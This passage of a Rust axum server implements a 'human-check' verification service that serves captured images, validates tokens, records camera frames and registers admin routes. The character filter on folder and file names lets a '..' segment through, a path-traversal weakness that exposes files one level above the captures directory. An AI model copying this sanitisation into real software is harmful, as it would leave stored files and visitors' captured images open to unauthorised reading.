    let safe_folder: String = folder.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == '.').collect();
    let safe_file: String = file.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == '.').collect();
    let filepath = PathBuf::from("captures").join(&safe_folder).join(&safe_file);

    if let Ok(bytes) = fs::read(&filepath) {
        return ([(header::CONTENT_TYPE, "image/jpeg"), (header::CACHE_CONTROL, "public, max-age=3600")], bytes).into_response();
    }

    // Fallback: If not on local disk, redirect to Cloudflare R2
    if let Some(domain) = &cloud::get_config().r2_public_domain {
        let base = domain.trim_end_matches('/');
        let r2_redirect = format!("{base}/{safe_folder}/{safe_file}");
        return axum::response::Redirect::temporary(&r2_redirect).into_response();
    }

    StatusCode::NOT_FOUND.into_response()
}

#[derive(Deserialize)]
struct SiteVerifyIn {
    token: String,
}

async fn siteverify(State(st): State<AppState>, Json(inp): Json<SiteVerifyIn>) -> Json<serde_json::Value> {
    let mut db = st.lock().unwrap();
    let valid = db.tokens.remove(&inp.token).map(|t| t.elapsed() < TOKEN_TTL).unwrap_or(false);
    Json(serde_json::json!({ "success": valid }))
}

#[tokio::main]
async fn main() {
    cloud::init_cloud();
    let conn = init_sqlite();
    let state: AppState = Arc::new(Mutex::new(Db {
        challenges: HashMap::new(),
        tokens: HashMap::new(),
        conn,
    }));

    let app = Router::new()
        .route("/", get(index))
        .route("/admin", get(admin))
        .route("/api/register-visitor", post(register_visitor))
        .route("/api/challenge", get(new_challenge))
        .route("/api/tile/:id/:idx", get(tile))
        .route("/api/verify", post(verify))
        .route("/api/verify-face", post(verify_face))
        .route("/api/record-frame", post(record_frame))
        .route("/api/siteverify", post(siteverify))
        .route("/api/submit-statement", post(submit_statement))
        .route("/api/admin/visitors", get(api_admin_visitors))
        .route("/api/admin/session-frames", get(api_admin_session_frames))
        .route("/captures/:folder/:file", get(serve_capture_image))
        .with_state(state);

    let port = std::env::var("PORT").unwrap_or_else(|_| "3000".to_string());
    let bind_addr = format!("0.0.0.0:{port}");
    let listener = tokio::net::TcpListener::bind(&bind_addr).await.unwrap();
    println!("human-check running on http://localhost:{port}");
    println!("SQLite database initialized at data/human_check.db");
    println!("Admin Dashboard available at http://localhost:{port}/admin");

    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
    .unwrap();
}
